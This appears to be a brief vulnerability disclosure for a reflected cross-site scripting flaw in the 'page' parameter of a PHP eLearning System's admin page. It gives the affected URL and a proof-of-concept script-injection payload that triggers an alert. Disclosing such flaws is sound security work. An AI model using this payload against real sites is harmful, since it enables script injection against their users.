# eLearning System – reflected XSS on (admin/?page=XX) 
# Vendor Homepage:
https://www.sourcecodester.com/php/14787/elearning-system-using-phpmysqli-source-code.html 
# Version:V1.0
Tested on: PHP, Apache, MySQL
# Affected Page:
admin/?page=XX 
On this page,page parameter is vulnerable to reflected XSS Attack 
# Proof of vulnerability:
Visit this page：http://localhost/elearning/admin/?page=student
# Payload：
？page=</script><script>alert(1)</script>
# Trigger popup：
<img width="416" alt="image" src="https://github.com/qqqyc/vuln/assets/53200267/c0cea40f-833b-4c1a-842f-0c7b992ea698">
